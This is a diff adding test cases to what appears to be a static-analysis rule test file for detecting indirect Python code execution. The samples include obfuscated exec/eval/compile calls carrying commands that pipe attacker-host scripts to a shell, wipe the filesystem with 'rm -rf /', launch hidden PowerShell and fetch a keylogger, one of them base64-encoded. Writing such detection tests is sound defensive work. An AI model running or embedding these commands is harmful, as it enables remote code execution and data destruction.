@@ -247,3 +247,45 @@ class install_ext_solibs(install_lib):
                     if not mext.group(1) in templates:
                         # ruleid: code-execution
                         self.spawn(["rm", "-f", f"{wheel}/{solib}"])
+
+"""
+compile() and vars() indirection patterns
+"""
+# ruleid: code-execution
+vars(__builtins__)['exec']("subprocess.call('/tmp/malware')")
+
+# ruleid: code-execution
+vars(__builtins__)['eval']("__import__('os').system('wget http://malicious.com/backdoor.sh')")
+
+# ruleid: code-execution
+vars(__builtins__)['compile']("os.system('malicious')", '<string>', 'exec')
+
+# ruleid: code-execution
+vars(__builtins__).get('exec')("subprocess.Popen('powershell -WindowStyle Hidden', shell=True)")
+
+# ruleid: code-execution
+vars(__builtins__).get('eval')("__import__('os').popen('curl http://attacker.com | sh')")
+
+# ruleid: code-execution
+vars(__builtins__).get('compile')("os.system('rm -rf /')", '<string>', 'exec')
+
+# ruleid: code-execution
+vars(globals()['__builtins__'])['exec']("os.system('malicious command')")
+
+# ruleid: code-execution
+vars(globals()['__builtins__'])['eval']("subprocess.Popen('backdoor', shell=True)")
+
+# ruleid: code-execution
+vars(locals()['__builtins__'])['exec']("subprocess.check_call(['rm', '-rf', '/'])")
+
+# ruleid: code-execution
+vars(locals()['__builtins__'])['eval']("os.popen('curl http://attacker.com/keylogger.py')")
+
+# ruleid: code-execution
+compile(__import__('base64').b64decode('ZXhlYyhfX2ltcG9ydF9fKCdvcycpLnN5c3RlbSgnZWNobyBtYWx3YXJlJykp'), '<string>', 'exec')
+
+# ruleid: code-execution
+compile("subprocess.Popen('powershell -EncodedCommand cABvAHc=', shell=False)", '<string>', 'eval')
+
+# ruleid: code-execution
+vars(__builtins__)['eval'](compile(__import__('base64').b64decode("X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2N1cmwgaHR0cDovL2V2aWwuY29tIHwgc2gnKQ=="), '<string>', 'exec'))
